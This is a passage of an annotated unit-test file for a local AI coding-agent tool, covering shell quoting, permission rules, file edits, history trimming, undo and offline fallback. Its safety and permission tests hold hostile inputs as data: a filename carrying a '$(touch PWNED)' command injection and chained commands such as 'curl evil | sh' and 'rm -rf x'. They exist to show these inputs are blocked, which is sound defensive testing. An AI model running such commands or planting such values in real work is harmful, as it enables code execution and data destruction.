+ 50 | port = int(sys.argv[sys.argv.index("--port") + 1])
+ 51 | born = time.time()
+ 52 | 
+ 53 | class Handler(BaseHTTPRequestHandler):
+ 54 |     def answer(self, code, body):
+ 55 |         data = json.dumps(body).encode()
+ 56 |         self.send_response(code)
+ 57 |         self.send_header("Content-Length", str(len(data)))
+ 58 |         self.end_headers()
+ 59 |         self.wfile.write(data)
+ 60 | 
+ 61 |     def do_GET(self):
+ 62 |         loaded = time.time() - born > 0.3                      # "loading" for a moment
+ 63 |         self.answer(200 if loaded else 503, {"status": "ok"} if loaded else {"error": "loading"})
+ 64 | 
+ 65 |     def do_POST(self):
+ 66 |         self.rfile.read(int(self.headers["Content-Length"]))
+ 67 |         self.answer(200, {"choices": [{"message": {"content": "local hello"}}],
+ 68 |                           "usage": {"prompt_tokens": 3, "completion_tokens": 2}})
+ 69 | 
+ 70 |     def log_message(self, *args):
+ 71 |         pass
+ 72 | 
+ 73 | HTTPServer(("127.0.0.1", port), Handler).serve_forever()
+ 74 | '''
+ 75 | 
+ 76 | 
+```
+- Imports the code under test (whole modules — `cli`, `localserver`, `runners` — where tests replace a function with a
+  mock, and names otherwise). The runner function `test_kind` is called as `runners.test_kind`: imported by its name, a
+  test tool such as pytest would mistake it for a test.
+- `check_commit` is loaded **from its file** with `importlib`, because `tools/` is a folder of scripts, not a package.
+- `FAKE_LLAMA` is a tiny stand-in for llama.cpp's server, saved to a file and started by the lifecycle test: it reads
+  `--port` like the real one, answers `/health` with 503 ("loading") for its first 0.3 seconds and 200 after, and
+  answers every chat request with "local hello".
+
+```python
+ 77 | def box(tmp: str, settings: dict | None = None, **kw) -> ToolBox:
+ 78 |     """A ToolBox on a temp folder that approves everything (no formatting, so bytes are exact)."""
+ 79 |     return ToolBox(replace(Config(), workspace=Path(tmp), auto_format=False, **kw),
+ 80 |                    lambda _a: True, settings)
+ 81 | 
+ 82 | 
+```
+```python
+ 83 | def free_port() -> int:
+ 84 |     """A TCP port nothing listens on right now."""
+ 85 |     with socket.socket() as probe:
+ 86 |         probe.bind(("127.0.0.1", 0))
+ 87 |         return int(probe.getsockname()[1])
+ 88 | 
+ 89 | 
+```
+- `box` makes a toolbox on a temporary folder that approves everything, with automatic formatting off so the bytes on
+  disk are exactly what the test expects. `free_port` asks the system for a port nothing listens on.
+
+## Safety
+```python
+ 90 | class SafetyTests(unittest.TestCase):
+```
+```python
+ 91 |     def test_file_names_are_quoted_for_the_shell(self):
+ 92 |         self.assertEqual(quote_for_shell("src/app.py"), "src/app.py")
+ 93 |         self.assertEqual(quote_for_shell("-rf.py"), "./-rf.py")
+ 94 |         quoted = quote_for_shell("a$(evil).py")
+ 95 |         self.assertNotEqual(quoted, "a$(evil).py")
+ 96 |         self.assertTrue(quoted.startswith("'") and quoted.endswith("'"))
+ 97 | 
+```
+```python
+ 98 |     def test_a_file_name_cannot_inject_a_command_into_a_hook(self):
+ 99 |         with tempfile.TemporaryDirectory() as tmp:
+100 |             payload = ("a$(New-Item -ItemType File -Path PWNED).txt" if os.name == "nt"
+101 |                        else "a$(touch PWNED).txt")
+102 |             tools = box(tmp, {"hooks": {"after_edit": "echo checking {file}"}})
+103 |             self.assertTrue(tools.call("write_file", {"path": payload, "content": "x"}).startswith("OK"))
+104 |             self.assertFalse((Path(tmp) / "PWNED").exists())
+105 | 
+```
+- Ordinary names are left alone, a leading `-` gets `./`, and a name with `$(...)` is wrapped in single quotes.
+- **The injection, end to end:** a hook `echo checking {file}` and a file named `a$(New-Item ... PWNED).txt` (on Linux
+  `a$(touch PWNED).txt`). The write succeeds and no `PWNED` file appears. Before the fix the same test created it.
+
+```python
+106 |     def test_timeout_stops_the_whole_process_tree(self):
+107 |         code = ("import subprocess, sys, time; "
+108 |                 "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']); "
+109 |                 "time.sleep(30)")
+110 |         started = time.time()
+111 |         exit_code, output = run_command([sys.executable, "-c", code], Path.cwd(), 2, 500)
+112 |         self.assertEqual(exit_code, 124)
+113 |         self.assertIn("timed out", output)
+114 |         self.assertLess(time.time() - started, 15)          # not the child's 30 seconds
+115 | 
+```
+```python
+116 |     def test_programs_get_no_keyboard_input(self):
+117 |         started = time.time()
+118 |         exit_code, output = run_command([sys.executable, "-c", "input('name? ')"], Path.cwd(), 20, 2000)
+119 |         self.assertNotEqual(exit_code, 0)
+120 |         self.assertIn("EOFError", output)
+121 |         self.assertLess(time.time() - started, 15)
+122 | 
+```
+- A program that starts a 30-second child and sleeps is stopped by a 2-second timeout well within 15 seconds, with
+  exit code 124 (before the fix: 25 seconds, waiting for the child).
+- A program calling `input()` fails at once with `EOFError` instead of waiting for the keyboard.
+
+```python
+123 |     def test_binary_files_and_skipped_folders(self):
+124 |         with tempfile.TemporaryDirectory() as tmp:
+125 |             (Path(tmp) / "a.bin").write_bytes(b"MZ\x00\x01")
+126 |             (Path(tmp) / "a.txt").write_text("hello", encoding="utf-8")
+127 |             self.assertTrue(looks_binary(Path(tmp) / "a.bin"))
+128 |             self.assertFalse(looks_binary(Path(tmp) / "a.txt"))
+129 |         self.assertTrue(skip_dir("localagent.egg-info") and skip_dir("target") and skip_dir("dist"))
+130 |         self.assertFalse(skip_dir("src"))
+131 | 
+```
+```python
+132 |     @unittest.skipUnless(shutil.which("git"), "git not installed")
+133 |     def test_gitignored_files_are_left_out_and_ignored_folders_still_work(self):
+134 |         with tempfile.TemporaryDirectory() as tmp:
+135 |             root = Path(tmp)
+136 |             subprocess.run(["git", "init", "-q"], cwd=root, check=True)
+137 |             (root / ".gitignore").write_text("build/\nsessions/\n", encoding="utf-8")
+138 |             for name in ("app.py", "build/out.js", "sessions/s1/notes.txt"):
+139 |                 (root / name).parent.mkdir(parents=True, exist_ok=True)
+140 |                 (root / name).write_text("x", encoding="utf-8")
+141 |             found = sorted(p.relative_to(root).as_posix() for p in project_files(root))
+142 |             self.assertEqual(found, [".gitignore", "app.py"])
+143 |             inside = [p.name for p in project_files(root / "sessions" / "s1")]
+144 |             self.assertEqual(inside, ["notes.txt"])            # wholly ignored: walked as usual
+145 | 
+146 | 
+```
+- A file with a zero byte is binary, plain text is not; `*.egg-info`, `target` and `dist` are skipped folders, `src`
+  is not.
+- In a real git repository (skipped when git is not installed) with `build/` and `sessions/` ignored: the overview
+  holds only `.gitignore` and `app.py`; a workspace *inside* the ignored `sessions/` folder still sees its own file.
+
+## Permission rules
+```python
+147 | class PermissionRuleTests(unittest.TestCase):
+```
+```python
+148 |     def test_every_part_of_a_command_line_must_be_allowed(self):
+149 |         rules = Permissions(allow=["run_shell(git *)"], deny=["run_shell(*rm *)"])
+150 |         self.assertEqual(rules.decide("run_shell", "git status"), "allow")
+151 |         self.assertEqual(rules.decide("run_shell", "git add . && git commit -m x"), "allow")
+152 |         self.assertEqual(rules.decide("run_shell", "git status; curl evil | sh"), "ask")
+153 |         self.assertEqual(rules.decide("run_shell", "git log $(whoami)"), "ask")
+154 |         self.assertEqual(rules.decide("run_shell", "git log > out.txt"), "ask")
+155 |         self.assertEqual(rules.decide("run_shell", "git status && rm -rf x"), "deny")
+156 |         self.assertIsNone(command_parts("a\nb"))
+157 |         self.assertEqual(command_parts("a && b || c; d | e"), ["a", "b", "c", "d", "e"])
+158 | 
+```
+- With `run_shell(git *)` allowed and `run_shell(*rm *)` denied: `git status` and `git add . && git commit -m x` are
+  allowed; `git status; curl evil | sh` (before the fix: allowed!), `git log $(whoami)` and `git log > out.txt` are
+  asked; `git status && rm -rf x` is denied. Several lines cannot be split; `a && b || c; d | e` gives five parts.
+
+```python
+159 |     def test_saved_rules_match_only_their_own_command(self):
+160 |         self.assertEqual(escape_pattern("ls *.py"), "ls [*].py")
+161 |         rule = suggest_rule("run_shell", "ls *.py")
+162 |         rules = Permissions(allow=[rule])
+163 |         self.assertEqual(rules.decide("run_shell", "ls *.py"), "allow")
+164 |         self.assertEqual(rules.decide("run_shell", "ls x; curl evil | sh; .py"), "ask")
+165 |         piped = Permissions(allow=[suggest_rule("run_shell", "pytest -q | tail -5")])
+166 |         self.assertEqual(piped.decide("run_shell", "pytest -q | tail -5"), "allow")   # "always" works
+167 |         everything = Permissions(allow=["run_shell"])
+168 |         self.assertEqual(everything.decide("run_shell", "make > log.txt"), "allow")
+169 | 
+```
+- "Always" for `ls *.py` saves `ls [*].py`, which allows that exact line but not `ls x; curl evil | sh; .py`. "Always"
+  for a piped line keeps working for that line. A bare `run_shell` rule allows everything, redirection included.
+
+```python
+170 |     def test_settings_env_and_test_command(self):
+171 |         with tempfile.TemporaryDirectory() as tmp:
+172 |             user = Path(tmp) / "user.json"
+173 |             user.write_text(json.dumps({"env": {"LA_TEST_ONE": "user", "LA_TEST_TWO": "user"},
+174 |                                         "test_command": "make test"}), encoding="utf-8")
+175 |             project = Path(tmp) / ".localagent" / "settings.json"
+176 |             project.parent.mkdir()
+177 |             project.write_text(json.dumps({"env": {"LA_TEST_TWO": "project"}}), encoding="utf-8")
+178 |             merged = load_settings(Path(tmp), user)
+179 |             self.assertEqual(merged["test_command"], "make test")
+180 |             with mock.patch.dict(os.environ, {"LA_TEST_ONE": "real"}):
+181 |                 self.assertEqual(apply_env(merged), ["LA_TEST_TWO"])
+182 |                 self.assertEqual((os.environ["LA_TEST_ONE"], os.environ["LA_TEST_TWO"]),
+183 |                                  ("real", "project"))                   # a real variable wins
+184 | 
+185 | 
+```
+- User and project files merge `env` (the project wins) and `test_command`; `apply_env` sets only the variable that was
+  not set already — a real variable wins.
+
+## Faithful edits, search and reading
+```python
+186 | class FaithfulEditTests(unittest.TestCase):
+```
+```python
+187 |     def test_line_endings_and_byte_order_mark_are_kept(self):
+188 |         with tempfile.TemporaryDirectory() as tmp:
+189 |             tools = box(tmp)
+190 |             for name, raw in (("lf.txt", b"one\ntwo\n"), ("crlf.txt", b"one\r\ntwo\r\n"),
+191 |                               ("bom.txt", b"\xef\xbb\xbfone\r\ntwo\r\n")):
+192 |                 (Path(tmp) / name).write_bytes(raw)
+193 |                 self.assertTrue(tools.call("edit_file", {"path": name, "old": "two",
+194 |                                                          "new": "2"}).startswith("OK"))
+195 |                 self.assertEqual((Path(tmp) / name).read_bytes(), raw.replace(b"two", b"2"))
+196 |             (Path(tmp) / "new.cmd").unlink(missing_ok=True)
+197 |             tools.call("write_file", {"path": "new.cmd", "content": "@echo off\necho hi\n"})
+198 |             self.assertEqual((Path(tmp) / "new.cmd").read_bytes(), b"@echo off\r\necho hi\r\n")
+199 | 
+```
+```python
+200 |     def test_rejected_write_restores_the_exact_bytes(self):
+201 |         with tempfile.TemporaryDirectory() as tmp:
+202 |             original = b"x = 1\ny = 2\n"
+203 |             (Path(tmp) / "m.py").write_bytes(original)
+204 |             result = box(tmp).call("edit_file", {"path": "m.py", "old": "y = 2", "new": "y = ("})
+205 |             self.assertTrue(result.startswith("REJECTED"))
+206 |             self.assertEqual((Path(tmp) / "m.py").read_bytes(), original)
+207 | 
+```
+- An LF file, a CRLF file and a CRLF file with a byte-order mark are each edited; the bytes on disk are exactly the old
+  bytes with one word changed. A new `.cmd` file gets CRLF.
+- A rejected edit of an LF Python file leaves its bytes untouched (before the fix it came back with CRLF).
+
+```python
+208 |     def test_python_with_a_byte_order_mark_or_an_old_encoding_is_valid_code(self):
+209 |         with tempfile.TemporaryDirectory() as tmp:
+210 |             root = Path(tmp)
+211 |             (root / "bom.py").write_bytes(b"\xef\xbb\xbfprint('hi')\n")      # as PowerShell writes it
+212 |             (root / "latin.py").write_bytes(b"# -*- coding: latin-1 -*-\nname = '\xe9'\n")
+213 |             tools = box(tmp)
+214 |             self.assertEqual(tools.check_workspace(), [])                  # Python runs both
+215 |             self.assertTrue(tools.call("run_python", {"path": "bom.py"}).startswith("exit code 0"))
+216 |             result = tools.call("edit_file", {"path": "bom.py", "old": "﻿print", "new": "print"})
+217 |             self.assertTrue(result.startswith("OK"), result)                # naming the mark removes it
+218 |             self.assertEqual((root / "bom.py").read_bytes(), b"print('hi')\n")
+219 | 
+```
+- A Python file starting with a byte-order mark (as PowerShell writes it) and a latin-1 file with a coding line both
+  pass the workspace check, the first one also runs; an edit whose `old` names the mark removes it. Added after the
+  live offline test in which the mark was taken for a syntax error.
+
+```python
+220 |     def test_empty_old_text_is_refused(self):
+221 |         with tempfile.TemporaryDirectory() as tmp:
+222 |             (Path(tmp) / "n.md").write_text("abc", encoding="utf-8")
+223 |             tools = box(tmp)
+224 |             self.assertIn("must not be empty", tools.call(
+225 |                 "edit_file", {"path": "n.md", "old": "", "new": "X", "all": True}))
+226 |             self.assertIn("must not be empty", tools.call(
+227 |                 "multi_edit", {"path": "n.md", "edits": [{"old": "", "new": "X"}]}))
+228 |             self.assertEqual((Path(tmp) / "n.md").read_text(encoding="utf-8"), "abc")
+229 | 
+```
+- `edit_file` with an empty `old` and `all=true`, and `multi_edit` with an empty `old`, are both refused; the file still
+  says `abc` (before the fix: `XaXbXcX`).
+
+```python
+230 |     def test_search_covers_every_text_file(self):
+231 |         with tempfile.TemporaryDirectory() as tmp:
+232 |             root = Path(tmp)
+233 |             (root / "src").mkdir()
+234 |             (root / "src" / "a.ts").write_text("const needle = 1;\n", encoding="utf-8")
+235 |             (root / "b.js").write_text("needle()\n", encoding="utf-8")
+236 |             (root / "c.py").write_text("needle = 3\n", encoding="utf-8")
+237 |             (root / "blob.bin").write_bytes(b"needle\x00")
+238 |             tools = box(tmp)
+239 |             everything = tools.call("search", {"pattern": "needle"})
+240 |             self.assertTrue(all(n in everything for n in ("src/a.ts:1", "b.js:1", "c.py:1")))
+241 |             self.assertNotIn("blob.bin", everything)
+242 |             both = tools.call("search", {"pattern": "needle", "glob": "*.{js,ts}"})
+243 |             self.assertTrue("a.ts" in both and "b.js" in both and "c.py" not in both)
+244 |             self.assertEqual(tools.call("search", {"pattern": "needle", "glob": "src/*"}),
+245 |                              "src/a.ts:1: const needle = 1;")
+246 |             self.assertIn("c.py:1", tools.call("search", {"pattern": "needle", "path": "c.py"}))
+247 | 
+```
+- A search without a glob finds `.ts`, `.js` and `.py` files but not the binary one; `*.{js,ts}` finds exactly the two;
+  `src/*` matches by path; and `path` may name one file.
+
+```python
+248 |     def test_read_file_refuses_binary_and_says_how_much_is_left(self):
+249 |         with tempfile.TemporaryDirectory() as tmp:
+250 |             (Path(tmp) / "model.bin").write_bytes(b"\x00\x01" * 100)
+251 |             (Path(tmp) / "t.txt").write_text("\n".join(f"line {i}" for i in range(1, 11)),
+252 |                                              encoding="utf-8")
+253 |             tools = box(tmp)
+254 |             self.assertIn("binary file", tools.call("read_file", {"path": "model.bin"}))
+255 |             part = tools.call("read_file", {"path": "t.txt", "start": 2, "end": 3})
+256 |             self.assertEqual(part, "2: line 2\n3: line 3\n(lines 2-3 of 10)")
+257 |             self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 50}),
+258 |                              "(the file has only 10 lines)")
+259 |             with mock.patch("localagent.tools.MAX_READ_BYTES", 10):
+260 |                 self.assertIn("too big", tools.call("read_file", {"path": "t.txt"}))
+261 |                 self.assertEqual(tools.call("read_file", {"path": "t.txt", "start": 9, "end": 9}),
+262 |                                  "9: line 9")
+263 | 
+264 | 
+```
+- A binary file is refused. Reading lines 2-3 of a 10-line file ends with `(lines 2-3 of 10)`; starting at line 50 says
+  the file has only 10 lines. With the size limit lowered to 10 bytes (a mock), a whole read is refused but a range is
+  read line by line.
+
+## Language checks
+```python
+265 | class LanguageCheckTests(unittest.TestCase):
+```
+```python
+266 |     def check(self, name: str, text: str) -> bool:
+267 |         with tempfile.TemporaryDirectory() as tmp:
+268 |             path = Path(tmp) / name
+269 |             path.write_text(text, encoding="utf-8")
+270 |             return verify_file(path, Path(tmp)).ok
+271 | 
+```
+```python
+272 |     def test_json_with_comments_where_the_format_allows_them(self):
+273 |         jsonc = '{\n  // options\n  "a": {"b": [1, 2,], /* note */ "c": "x // y, }",},\n}\n'
+274 |         self.assertTrue(self.check("tsconfig.json", jsonc))
+275 |         self.assertTrue(self.check("settings.jsonc", jsonc))
+276 |         self.assertFalse(self.check("package.json", jsonc))         # npm would reject it too
+277 |         self.assertTrue(self.check("data.json", '﻿{"a": 1}'))  # a byte-order mark is fine
+278 |         self.assertEqual(json.loads(strip_jsonc('{"u": "http://x//y", "c": "a, }",}')),
+279 |                          {"u": "http://x//y", "c": "a, }"})
+280 | 
+```
+- One JSONC text (comments, trailing commas, and a string containing `//` and `, }`) passes as `tsconfig.json` and as
+  `settings.jsonc` but fails as `package.json`; a JSON file with a byte-order mark passes; `strip_jsonc` keeps strings
+  intact.
+
+```python
+281 |     @unittest.skipUnless(shutil.which("gcc") and shutil.which("g++"), "gcc/g++ not installed")
+282 |     def test_header_files_may_be_c_or_cpp(self):
+283 |         self.assertTrue(self.check("shape.h", "namespace g { class S { public: int x; }; }\n"))
+284 |         self.assertTrue(self.check("point.h", "struct point { int x, y; };\n"))
+285 |         self.assertFalse(self.check("broken.h", "class X { int y }\n"))
+286 | 
+```
+```python
+287 |     @unittest.skipUnless(shutil.which("rustfmt"), "rustfmt not installed")
+288 |     def test_rust_files_may_name_modules_not_written_yet(self):
+289 |         self.assertTrue(self.check("main.rs", "mod util;\nfn main() { util::hi(); }\n"))
+290 |         self.assertFalse(self.check("bad.rs", "mod util;\nfn main() { let x = ; }\n"))
+291 | 
+292 | 
+```
+- A C++ header and a C header named `.h` both pass, a broken one fails (needs gcc and g++).
+- `main.rs` declaring a module that does not exist yet passes; a syntax error still fails (needs rustfmt).
+
+## Running tests the project's way
+```python
+293 | class TestRunnerTests(unittest.TestCase):
+```
+```python
+294 |     def test_the_right_test_tool_is_chosen(self):
+295 |         with tempfile.TemporaryDirectory() as tmp:
+296 |             root = Path(tmp)
+297 |             self.assertEqual(runners.test_kind(root), "python")
+298 |             (root / "package.json").write_text('{"scripts": {"test": "jest"}}', encoding="utf-8")
+299 |             self.assertEqual(runners.test_kind(root), "npm")
+300 |             (root / "package.json").write_text(
+301 |                 '{"scripts": {"test": "echo \\"Error: no test specified\\" && exit 1"}}',
+302 |                 encoding="utf-8")
+303 |             self.assertEqual(runners.test_kind(root), "python")     # npm's placeholder
+304 |             (root / "go.mod").write_text("module x\n", encoding="utf-8")
+305 |             self.assertEqual(runners.test_kind(root), "go")
+306 |             (root / "tests").mkdir()
+307 |             (root / "tests" / "test_a.py").write_text("", encoding="utf-8")
+308 |             self.assertEqual(runners.test_kind(root), "python")     # Python tests win
+309 |             self.assertEqual(runners._unittest_start(root), "-s tests")
+310 | 
+```
+- An empty folder → `python`; a `package.json` with a real test script → `npm`; npm's placeholder script → `python`;
+  a `go.mod` → `go`; Python tests in a plain `tests` folder → `python` again (they win), started with `-s tests`.
+
+```python
+311 |     def test_tests_in_a_plain_tests_folder_are_found(self):
+312 |         with tempfile.TemporaryDirectory() as tmp:
+313 |             (Path(tmp) / "tests").mkdir()
+314 |             (Path(tmp) / "tests" / "test_a.py").write_text(
+315 |                 "import unittest\nclass T(unittest.TestCase):\n    def test_x(self):\n"
+316 |                 "        self.assertTrue(True)\n", encoding="utf-8")
+317 |             result = box(tmp).call("run_tests", {})
+318 |             self.assertTrue(result.startswith("exit code 0"), result)
+319 |             self.assertTrue("Ran 1 test" in result or "1 passed" in result, result)
+320 | 
+```
+```python
+321 |     def test_your_own_test_command_from_the_settings(self):
+322 |         with tempfile.TemporaryDirectory() as tmp:
+323 |             result = box(tmp, {"test_command": "echo custom-tests-ran"}).call("run_tests", {})
+324 |             self.assertIn("custom-tests-ran", result)
+325 | 
+```
+```python
+326 |     def test_the_project_virtual_environment_is_used(self):
+327 |         with tempfile.TemporaryDirectory() as tmp:
+328 |             self.assertEqual(runners.project_python(Path(tmp)), sys.executable)
+329 |             inside = "Scripts/python.exe" if os.name == "nt" else "bin/python"
+330 |             fake = Path(tmp) / ".venv" / inside
+331 |             fake.parent.mkdir(parents=True)
+332 |             fake.write_text("", encoding="utf-8")
+333 |             self.assertEqual(runners.project_python(Path(tmp)), str(fake))
+334 | 
+335 | 
+```
+- A test in `tests/` without `__init__.py` really runs (`Ran 1 test`, or `1 passed` where pytest is installed) — before
+  the fix: `Ran 0 tests`, exit code 5.
+- A `test_command` from the settings is what runs.
+- Without a project environment the agent's Python is used; with a `.venv` holding a Python, that one is.
+
+## History, empty answers, cut-off answers, switching
+```python
+336 | class HistoryTests(unittest.TestCase):
+```
+```python
+337 |     def history(self) -> list[dict]:
+338 |         big_call = {"id": "c1", "function": {"name": "write_file",
+339 |                                              "arguments": {"path": "a.py", "content": "x" * 5000}},
+340 |                     "extra_content": {"google": {"thought_signature": "S"}}}
+341 |         return [{"role": "system", "content": "sys"},
+342 |                 {"role": "user", "content": "first request"},
+343 |                 {"role": "assistant", "content": "", "tool_calls": [big_call]},
+344 |                 {"role": "tool", "tool_call_id": "c1", "content": "y" * 3000},
+345 |                 {"role": "assistant", "content": "done"},
+346 |                 {"role": "user", "content": "second"},
+347 |                 {"role": "assistant", "content": "ok"},
+348 |                 {"role": "user", "content": "third"},
+349 |                 {"role": "assistant", "content": "fine"}]
+350 | 
+```
+- A small conversation whose first tool call writes 5 000 characters (with a thought signature) and whose tool result
+  has 3 000.
+
+```python
+351 |     def test_tool_call_arguments_count_and_are_shortened_last(self):
+352 |         history = self.history()
+353 |         self.assertGreater(message_size(history[2]), 5000)
+354 |         fitted = fit_history(history, 6000)
+355 |         self.assertEqual(fitted[3]["content"], REMOVED)                  # 1. output blanked
+356 |         self.assertEqual(fitted[2]["tool_calls"][0]["function"]["arguments"]["content"], "x" * 5000)
+357 |         shorter = fit_history(history, 1000)                             # 2. arguments shortened
+358 |         call = shorter[2]["tool_calls"][0]
+359 |         self.assertEqual(call["function"]["arguments"], {"path": "a.py", "content": SHORTENED})
+360 |         self.assertNotIn("extra_content", call)
+361 |         self.assertEqual(history[3]["content"], "y" * 3000)             # the original is untouched
+362 | 
+```
+```python
+363 |     def test_oldest_exchanges_are_dropped_only_as_a_last_resort(self):
+364 |         history = self.history()
+365 |         history[1] = {"role": "user", "content": "z" * 9000}
+366 |         fitted = fit_history(history, 2000)
+367 |         self.assertEqual(fitted[0]["content"], "sys")
+368 |         self.assertEqual(fitted[1], {"role": "user", "content": "second"})   # starts with a request
+369 |         self.assertEqual(fitted[-4:], history[-4:])
+370 | 
+```
+- The call's size includes its arguments. A budget of 6 000 blanks the old output but keeps the arguments; a budget
+  of 1 000 also shortens them (keeping `path`, dropping the signature). The original list is never changed.
+- When even that cannot fit (a 9 000-character first request), the oldest exchange is dropped: the result starts with
+  the system prompt and the next user message, and the last four messages are unchanged.
+
+```python
+371 |     def make(self, tmp, script, **kw):
+372 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
+373 |         return Agent(cfg, FakeBackend(script), ToolBox(cfg, lambda _q: True), Meter())
+374 | 
+```
+```python
+375 |     def test_the_agent_measures_arguments_too(self):
+376 |         with tempfile.TemporaryDirectory() as tmp:
+377 |             agent = self.make(tmp, [])
+378 |             before = agent._size()
+379 |             agent.messages.append(self.history()[2])
+380 |             self.assertGreater(agent._size() - before, 5000)
+381 | 
+```
+```python
+382 |     def test_an_empty_answer_is_retried_once(self):
+383 |         with tempfile.TemporaryDirectory() as tmp:
+384 |             empty = {"role": "assistant", "content": ""}
+385 |             agent = self.make(tmp, [empty, {"role": "assistant", "content": "4"}])
+386 |             self.assertEqual(agent.run("what is 2+2?"), "4")
+387 |             self.assertIn(EMPTY_REPLY, [m["content"] for m in agent.messages])
+388 |             self.assertNotIn("", [m["content"] for m in agent.messages if m["role"] == "assistant"
+389 |                                   and not m.get("tool_calls")])
+390 |             twice = self.make(tmp, [empty, empty])
+391 |             self.assertEqual(twice.run("hello?"), EMPTY_TWICE)
+392 | 
+```
+- `make` builds an agent with a scripted model. Adding the big call grows the agent's measured size by more than 5 000.
+- An empty answer followed by "4" returns "4", with the reminder in the history and no empty assistant message left
+  in it; two empty answers return `EMPTY_TWICE`.
+
+```python
+393 |     def test_cut_off_arguments_are_explained_and_a_cut_off_answer_is_kept(self):
+394 |         with tempfile.TemporaryDirectory() as tmp:
+395 |             broken = {"role": "assistant", "content": "", "tool_calls": [
+396 |                 {"function": {"name": "write_file", "arguments": '{"path": "a.py", "content": "pri'}}]}
+397 |             cut = {"role": "assistant", "content": "", "tool_calls": [
+398 |                 {"function": {"name": "finish", "arguments": '{"summary": "The answer is 42 bec'}}]}
+399 |             agent = self.make(tmp, [broken, cut])
+400 |             answer = agent.run("explain")
+401 |             self.assertIn(BAD_ARGUMENTS, [m["content"] for m in agent.messages if m["role"] == "tool"])
+402 |             self.assertEqual(answer, "The answer is 42 bec [answer cut off]")
+403 | 
+```
+```python
+404 |     def test_polite_requests_still_count_as_changes(self):
+405 |         for text in ("Please fix the bug", "can you add a test?", "Go ahead and create it",
+406 |                      "I want you to rename x"):
+407 |             self.assertTrue(_wants_change(text), text)
+408 |         for text in ("Can you explain this?", "why is it slow", "please"):
+409 |             self.assertFalse(_wants_change(text), text)
+410 | 
+```
+```python
+411 |     def test_switching_models_keeps_the_conversation(self):
+412 |         with tempfile.TemporaryDirectory() as tmp:
+413 |             agent = self.make(tmp, [{"role": "assistant", "content": "online answer"}])
+414 |             agent.run("first")
+415 |             local = FakeBackend([{"role": "assistant", "content": "offline answer"}])
+416 |             agent.set_backend(local, replace(Config(), backend="local", num_ctx=8192))
+417 |             self.assertIs(agent.backend, local)
+418 |             self.assertEqual(agent.run("second"), "offline answer")
+419 |             self.assertIn("first", [m["content"] for m in agent.messages])
+420 | 
+421 | 
+```
+- A `write_file` with cut-off arguments gets `BAD_ARGUMENTS`; a cut-off `finish` returns
+  `The answer is 42 bec [answer cut off]`.
+- "Please fix", "can you add", "Go ahead and create", "I want you to rename" want changes; "Can you explain", "why is
+  it slow" and "please" alone do not.
+- After `set_backend` the new model answers, `agent.backend` is it, and the first request is still in the history.
+
+## Sessions and `/undo`
+```python
+422 | class SessionAndUndoTests(unittest.TestCase):
+```
+```python
+423 |     def test_resume_skips_what_reset_or_compact_left_behind(self):
+424 |         with tempfile.TemporaryDirectory() as tmp:
+425 |             log = SessionLog(Path(tmp))
+426 |             log.append({"role": "user", "content": "secret topic"})
+427 |             log.mark("reset")
+428 |             log.append({"role": "user", "content": "new topic"})
+429 |             with log.path.open("a", encoding="utf-8") as handle:
+430 |                 handle.write('{"role": "user", "cont')               # a crash mid-write
+431 |             self.assertEqual(load_session(log.path), [{"role": "user", "content": "new topic"}])
+432 |             self.assertIn("secret topic", session_title(log.path))  # titled by its first request
+433 | 
+```
+```python
+434 |     def test_agent_marks_reset_and_compaction_in_the_log(self):
+435 |         with tempfile.TemporaryDirectory() as tmp:
+436 |             cfg = replace(Config(), workspace=Path(tmp))
+437 |             log = SessionLog(Path(tmp) / "s")
+438 |             agent = Agent(cfg, FakeBackend([{"role": "assistant", "content": "a"}] * 3
+439 |                                            + [{"role": "assistant", "content": "SUMMARY"}]),
+440 |                           ToolBox(cfg), Meter(), log)
+441 |             agent.run("one")
+442 |             agent.reset()
+443 |             agent.run("two")
+444 |             agent.run("three")
+445 |             agent.compact()
+446 |             restored = load_session(log.path)
+447 |             self.assertIn("SUMMARY", restored[0]["content"])
+448 |             self.assertFalse(any("one" == m.get("content") for m in restored))
+449 | 
+```
+- A log with "secret topic", a reset, "new topic" and a half-written line resumes with only "new topic"; its title
+  still shows the first request.
+- An agent that answered, was reset, answered twice and compacted resumes with the summary first, and the request from
+  before the reset is gone.
+
+```python
+450 |     def test_undo_skips_quiet_requests_and_keeps_your_own_edits(self):
+451 |         with tempfile.TemporaryDirectory() as tmp:
+452 |             root = Path(tmp)
+453 |             (root / "a.txt").write_text("v1", encoding="utf-8")
+454 |             (root / "b.txt").write_text("b1", encoding="utf-8")
+455 |             points = Checkpoints(root)
+456 |             points.take("change a and b")
+457 |             (root / "a.txt").write_text("v2", encoding="utf-8")
+458 |             (root / "b.txt").write_text("b2", encoding="utf-8")
+459 |             (root / "c.txt").write_text("new", encoding="utf-8")
+460 |             points.commit()
+461 |             points.take("just a question")
+462 |             points.commit()                                         # changed nothing: no step
+463 |             time.sleep(0.05)
+464 |             (root / "b.txt").write_text("my own edit", encoding="utf-8")
+465 |             message = points.undo()
+466 |             self.assertEqual((root / "a.txt").read_text(encoding="utf-8"), "v1")
+467 |             self.assertEqual((root / "b.txt").read_text(encoding="utf-8"), "my own edit")
+468 |             self.assertFalse((root / "c.txt").exists())
+469 |             self.assertIn('restored 1 file(s), removed 1 new file(s) (from "change a and b")', message)
+470 |             self.assertIn("left 1 file(s) alone", message)
+471 |             self.assertEqual(points.undo(), "nothing to undo")
+472 | 
+```
+```python
+473 |     def test_snapshots_store_each_content_once(self):
+474 |         with tempfile.TemporaryDirectory() as tmp:
+475 |             for i in range(5):
+476 |                 (Path(tmp) / f"f{i}.txt").write_text("same content", encoding="utf-8")
+477 |             points = Checkpoints(Path(tmp))
+478 |             for _ in range(3):
+479 |                 points.take()
+480 |                 points.commit()
+481 |             self.assertEqual(len(points._blobs), 1)
+482 | 
+483 | 
+```
+- A request changes `a.txt` and `b.txt` and creates `c.txt`; a question changes nothing; then *you* edit `b.txt`. `/undo`
+  restores `a.txt`, removes `c.txt`, leaves your `b.txt` alone and says so, naming the request; the question was never
+  an undo step. A second `/undo` has nothing to do.
+- Five files with the same content, snapshotted three times, are stored once.
+
+## Offline detection
+```python
+484 | class OfflineTests(unittest.TestCase):
+```
+```python
+485 |     def chain(self, hosted, local=None, probe=None, clock=None):
+486 |         notices: list[str] = []
+487 |         entries = [Entry("gemini-x", hosted, RateLimiter("gemini-x", 100, 10**6, 100))]
+488 |         if local is not None:
+489 |             entries.append(Entry("local", local))
